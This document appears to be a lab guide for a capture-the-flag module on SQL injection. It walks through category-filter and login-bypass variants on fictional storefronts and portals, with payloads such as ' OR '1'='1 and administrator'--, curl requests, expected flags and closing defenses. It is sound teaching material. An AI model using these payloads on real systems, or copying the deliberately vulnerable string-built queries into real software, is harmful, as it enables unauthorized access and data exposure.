# Case Study: Lab 7 - SQL Injection

## Business Context

**Company**: DataFlow E-Commerce Platform  
**Role**: Database Security Assessor  
**Date**: Q2 2026  
**Severity**: CRITICAL ⚠️

---

## Executive Summary

DataFlow Module 7 currently simulates SQL injection weaknesses in two active challenge groups:

1. Category filter manipulation in three themed catalog systems (Lab 7.1 A-C)
2. Login bypass through comment-style payloads in three themed authentication systems (Lab 7.2 A-C)

Your task is to **identify and exploit SQL injection-style behavior** by tampering request parameters, exposing unreleased records, and bypassing authentication gates.

---

## Business Problem

The platform includes legacy-style SQL query construction patterns based on untrusted input:

```python
# VULNERABLE PATTERN
category = request.args.get('category')
query = f"SELECT * FROM products WHERE category = '{category}'"
```

```python
# VULNERABLE PATTERN
username = request.form.get('username')
password = request.form.get('password')
query = f"SELECT id, username, role FROM users WHERE username = '{username}' AND password = '{password}'"
```

**Consequences:**
- Hidden/unreleased records become visible
- Authentication gates can be bypassed
- Query integrity assumptions are broken
- Trust boundaries between user input and data access are violated

---

## Challenge: Lab 7.1 - SQL Injection in Catalog Filters

### Problem Statement

Three themed catalog applications allow users to filter products by category. Input tampering can trigger SQL injection-style bypass logic that returns unreleased products.

---

## VARIANT 7.1 A: GiftShop Category Filter Bypass

### Problem Statement
GiftShop category filtering trusts user-controlled `category` input. When SQLi-like patterns are present (`' OR`, `'OR`, or `1=1`), the filter bypasses release controls and returns all products.

### Vulnerability Description
User input influences query intent without strict validation.

**Vulnerable Code Pattern:**
```python
category = request.args.get('category')
query = f"SELECT * FROM products WHERE category = '{category}'"
```

### Attack Vector
```sql
Gifts' OR '1'='1
```

### Step-by-Step Exploitation

**Step 1: Normal Request**
```
GET /lab7/1?category=Gifts
Result: Released products only
```

**Step 2: Tampered Request**
```
GET /lab7/1?category=Gifts' OR '1'='1
Result: Released + unreleased products shown
```

**Step 3: Verify Vulnerability**
```
Compare outputs:
- Normal input: released catalog
- Tampered input: hidden products visible
```

**Step 4: Claim Flag**
```
Flag appears in success banner after bypass is detected
Variation: variation_A
```

### Expected Results
```json
{
  "route": "/lab7/1",
  "payload": "Gifts' OR '1'='1",
  "result": "Unreleased products exposed",
  "flag": "FLAG{lab7_variation_A_[hash12]}"
}
```

---

## VARIANT 7.1 B: OfficeCore Category Filter Bypass

### Problem Statement
OfficeCore uses the same vulnerable category trust model as Variant A, but with a different themed catalog dataset.

### Vulnerability Description
Bypass is triggered by SQLi-style token patterns in category input.

**Vulnerable Code Pattern:**
```python
category = request.args.get('category')
query = f"SELECT * FROM products WHERE category = '{category}'"
```

### Attack Methodology

**Step 1: Baseline Request**
```http
GET /lab7/1/b?category=Work
```

**Step 2: Bypass Payload**
```http
GET /lab7/1/b?category=Work' OR '1'='1
```

**Step 3: Validate Outcome**
```
Look for unreleased OfficeCore items in results
```

### Expected Results
```json
{
  "route": "/lab7/1/b",
  "technique": "OR-based filter bypass",
  "payload": "Work' OR '1'='1",
  "flag": "FLAG{lab7_variation_B_[hash12]}"
}
```

---

## VARIANT 7.1 C: Summit Supply Category Filter Bypass

### Problem Statement
Summit Supply follows the same vulnerable logic: category tampering can bypass intended release filtering and display hidden expedition products.

### Vulnerability Description
The application treats SQLi-like strings as valid filter input and returns all rows.

**Vulnerable Code Pattern:**
```python
category = request.args.get('category')
query = f"SELECT * FROM products WHERE category = '{category}'"
```

### Attack Methodology

**Step 1: Baseline**
```http
GET /lab7/1/c?category=Adventure
```

**Step 2: Inject SQLi-like Payload**
```http
GET /lab7/1/c?category=Adventure' OR '1'='1
```

**Step 3: Confirm Hidden Data Exposure**
```
Unreleased Summit Supply products become visible
```

### Expected Results
```json
{
  "route": "/lab7/1/c",
  "technique": "Filter bypass via injected condition",
  "payload": "Adventure' OR '1'='1",
  "flag": "FLAG{lab7_variation_C_[hash12]}"
}
```

---

## VARIANT 7.1 D: Unquoted Numeric Parameter Injection

### Problem Statement
In the current Module 7 build, Variant 7.1.D is not active as an exploitable lab. Route `/lab7/1/d` redirects to the 7.1 variant menu.

### Vulnerability Description
No standalone 7.1.D exploitation flow is currently exposed to learners.

### Attack Vector
```text
N/A in current build (redirect behavior)
```

### Expected Results
```json
{
  "route": "/lab7/1/d",
  "status": "redirect",
  "target": "/lab7/1/menu"
}
```

---

## Challenge: Lab 7.2 - SQL Injection in Authentication

### Problem Statement

Three login portals build SQL query strings using user-supplied credentials. Authentication can be bypassed via a comment-style username payload recognized by backend logic.

```python
# VULNERABLE PATTERN
username = request.form.get('username')
password = request.form.get('password')
query = f"SELECT id, username, role FROM portal_users WHERE username = '{username}' AND password = '{password}'"
```

---

## VARIANT 7.2 A: Comment-Based Authentication Bypass (Northstar Office)

### Problem Statement
Northstar Office login accepts a comment-style username payload that effectively bypasses password validation logic.

### Vulnerability Description
If username contains `administrator'--` (or `administrator' --`), authentication is marked successful and an admin profile is returned.

### Attack Vector
```
Username: administrator'--
Password: anything
```

### Expected Results
```json
{
  "route": "/lab7/2/login",
  "technique": "Comment-based authentication bypass",
  "payload": "administrator'--",
  "result": "Administrative access granted",
  "flag": "FLAG{lab7_variation_A_[hash12]}"
}
```

---

## VARIANT 7.2 B: Comment Injection for Password Elimination (Aegis Workforce)

### Problem Statement
Aegis Workforce uses the same vulnerable login pattern with different branding and query label.

### Vulnerability Description
Username comment payload causes bypass and displays privileged user details.

### Attack Vector
```
Username: administrator' --
Password: anything

Observed query pattern:
SELECT id, username, role FROM staff_accounts WHERE username = 'administrator'--
```

### Expected Results
```json
{
  "route": "/lab7/2/b/login",
  "technique": "Comment-based bypass",
  "payload": "administrator' --",
  "flag": "FLAG{lab7_variation_B_[hash12]}"
}
```

---

## VARIANT 7.2 C: Comment Injection in Helix Admin Gateway

### Problem Statement
Helix Admin also uses the same backend bypass logic and demonstrates SQL comment injection impact in a third environment.

### Vulnerability Description
Single-stage bypass using crafted username input; no separate post-auth SQLi stage is currently implemented.

### Attack Vector
```
Username: administrator'--
Password: anything
```

### Expected Results
```json
{
  "route": "/lab7/2/c/login",
  "technique": "Comment-based authentication bypass",
  "result": "Privileged session context displayed",
  "flag": "FLAG{lab7_variation_C_[hash12]}"
}
```

---

## Challenge: Lab 7.3 - Time-Based Blind SQL Injection

### Problem Statement

Time-based blind SQL injection is not currently exposed as an active route in Module 7.

### Current Module Status:

**Objective 1: Route Availability Check**
1. Review Lab 7 navigation
2. Confirm only Lab 7.1 and Lab 7.2 are active
3. Validate there is no active `/lab7/3` learner flow

**Objective 2: Scope Clarification**
- Focus testing on active variant routes in 7.1 and 7.2
- Do not expect timing side-channel flag logic in current build

---

## General SQL Injection Exploitation Guide

### Step 1: Identify Injection Points
```
Test active Module 7 inputs:
- URL parameter: category (Lab 7.1 variants)
- Form field: username (Lab 7.2 variants)
- Form field: password (included in query construction)
```

### Step 2: Detect the Vulnerability
```
Payloads to test in this module:
1. Category bypass: Gifts' OR '1'='1
2. Category bypass (no spaces): Gifts'OR'1'='1
3. Login bypass: administrator'--
4. Login bypass: administrator' --

Observe:
- Hidden products become visible (Lab 7.1)
- Authentication succeeds without valid password (Lab 7.2)
- Flag appears in completion banner
```

### Step 3: Determine Query Structure
```
Lab 7.1 pattern:
SELECT * FROM products WHERE category = '[user_input]'

Lab 7.2 pattern:
SELECT id, username, role FROM [table] WHERE username = '[user_input]' AND password = '[user_input]'
```

### Step 4: Validate Data Exposure

**For category variants:**
```text
Confirm products marked UNRELEASED are shown after payload execution.
```

**For login variants:**
```text
Confirm admin profile fields and executed query are displayed after bypass.
```

### Step 5: Capture Evidence

**Required artifacts:**
```text
- Request payload used
- Before/after behavior comparison
- Variant route tested
- Flag captured
```

---

## Detection & Exploitation Tools

### Manual Testing with Curl
```bash
# Lab 7.1.A category bypass
curl "http://target/lab7/1?category=Gifts' OR '1'='1"

# Lab 7.1.B category bypass
curl "http://target/lab7/1/b?category=Work' OR '1'='1"

# Lab 7.2.A login bypass
curl -X POST "http://target/lab7/2/login" \
  -d "username=administrator'--&password=x"
```

### Browser + DevTools
1. Intercept category and login requests
2. Modify user-controlled parameters
3. Replay requests with bypass payloads
4. Capture response evidence and flags

### Burp Suite (Optional)
1. Proxy request from the active Lab 7 route
2. Send to Repeater
3. Iterate payloads for each variant
4. Record the first payload that triggers flag generation

---

## What You Should Discover

### Lab 7.1 Expected Findings:
```json
{
  "GiftShop (7.1.A)": {
    "route": "/lab7/1",
    "payload": "Gifts' OR '1'='1",
    "result": "Unreleased products visible",
    "flag": "FLAG{lab7_variation_A_[hash12]}"
  },
  "OfficeCore (7.1.B)": {
    "route": "/lab7/1/b",
    "payload": "Work' OR '1'='1",
    "result": "Unreleased products visible",
    "flag": "FLAG{lab7_variation_B_[hash12]}"
  },
  "Summit Supply (7.1.C)": {
    "route": "/lab7/1/c",
    "payload": "Adventure' OR '1'='1",
    "result": "Unreleased products visible",
    "flag": "FLAG{lab7_variation_C_[hash12]}"
  }
}
```

### Lab 7.2 Expected Findings:
```json
{
  "Northstar Office (7.2.A)": {
    "route": "/lab7/2/login",
    "payload": "username: administrator'--",
    "result": "Authentication bypassed",
    "flag": "FLAG{lab7_variation_A_[hash12]}"
  },
  "Aegis Workforce (7.2.B)": {
    "route": "/lab7/2/b/login",
    "payload": "username: administrator' --",
    "result": "Authentication bypassed",
    "flag": "FLAG{lab7_variation_B_[hash12]}"
  },
  "Helix Admin (7.2.C)": {
    "route": "/lab7/2/c/login",
    "payload": "username: administrator'--",
    "result": "Authentication bypassed",
    "flag": "FLAG{lab7_variation_C_[hash12]}"
  }
}
```

### Lab 7.3 Expected Findings:
```json
{
  "status": "not_active_in_current_module",
  "notes": "No exposed /lab7/3 route in this build"
}
```

---

## Technical Concepts

### SQL Injection Attack Categories (As Applied in Current Module)

**1. In-Band Style Payload Tampering**
```
Input includes SQL-like syntax
Application behavior changes immediately
Used in Lab 7.1 category filters
```

**2. Authentication Query Manipulation**
```
Username payload alters intended query logic
Password validation is effectively bypassed
Used in Lab 7.2 login flows
```

**3. Variant-Scoped Flag Generation**
```
Flags are generated per lab variation
Captured only when bypass condition is met
```

**4. Route Scope Validation**
```
Not every documented historical variant is active
Always verify route availability in current build
```

---

## SQL Injection Syntax by Database

### MySQL
```sql
-- Comment syntax: -- and #
Classic bypass pattern: ' OR '1'='1
```

### PostgreSQL
```sql
-- Comment syntax: --
Same core injection risk when queries are concatenated
```

### MSSQL
```sql
-- Comment syntax: --
Concatenated login queries remain vulnerable to tampering
```

---

## Exploitation Workflow

```
1. Identify active lab route
   ↓
2. Locate controllable input (category or username)
   ↓
3. Submit baseline request and capture normal output
   ↓
4. Replay with SQLi-style bypass payload
   ↓
5. Confirm state change:
   - Hidden records exposed, or
   - Authentication bypassed
   ↓
6. Capture generated flag
   ↓
7. Document payload, route, and evidence
```

---

## Flag Submission Checklist

- [ ] Identified active variant route
- [ ] Confirmed vulnerable parameter
- [ ] Validated bypass with tampered payload
- [ ] Captured flag for each active variant
- [ ] Documented query behavior change
- [ ] Submitted findings with reproducible steps

---

## Real-World Impact

**Successful SQL injection patterns allow:**
- Exposure of restricted records
- Unauthorized administrative access
- Bypass of security controls
- Loss of trust in data access boundaries
- Increased breach and compliance risk

**Business consequences include:**
- Regulatory penalties
- Incident response and remediation cost
- Customer confidence erosion
- Operational disruption

---

## Defense Strategies (Learn These!)

### ✅ Prepared Statements / Parameterized Queries
```python
# SECURE
cursor.execute(
    "SELECT id, username, role FROM users WHERE username = ? AND password = ?",
    (username, password)
)
```

### ✅ Input Validation & Whitelist
```python
# Validate expected input for category filters
allowed_categories = ['Gifts', 'Accessories', 'Lifestyle', 'Tech']
if category not in allowed_categories:
    raise ValueError("Invalid category")
```

### ✅ Defensive Authentication Design
```python
# Never build SQL auth checks with string concatenation
# Always hash + verify password separately from query composition
```

### ✅ Least Privilege
- Use read-only accounts where possible
- Restrict high-privilege roles to dedicated service identities
- Separate application and administrative database credentials

### ✅ Monitoring and Alerting
- Detect suspicious payload patterns (`' OR`, `--`)
- Log rejected and anomalous auth attempts
- Alert on unusual record exposure events

---

## Key Takeaways

1. **Current Module 7 active scope is Lab 7.1 (A-C) and Lab 7.2 (A-C)**
2. **Lab 7.1 demonstrates category filter bypass and hidden record exposure**
3. **Lab 7.2 demonstrates login bypass through comment payloads**
4. **Variant 7.1.D and Lab 7.3 are not active exploitation flows in this build**
5. **Parameterized queries remain the primary fix for SQL injection risk**
6. **Route verification is essential when validating lab behavior against documentation**
7. **Document payload, response delta, and captured flag for each tested variant**

---

## Related Concepts

- **CWE-89**: SQL Injection
- **OWASP A03:2021**: Injection
- **Authentication Bypass**: Logic flaws in credential validation paths
- **Secure Query Construction**: Parameter binding and strict input handling

---

**Document your findings thoroughly. Include active route, payload used, behavior change observed, and captured flag.**
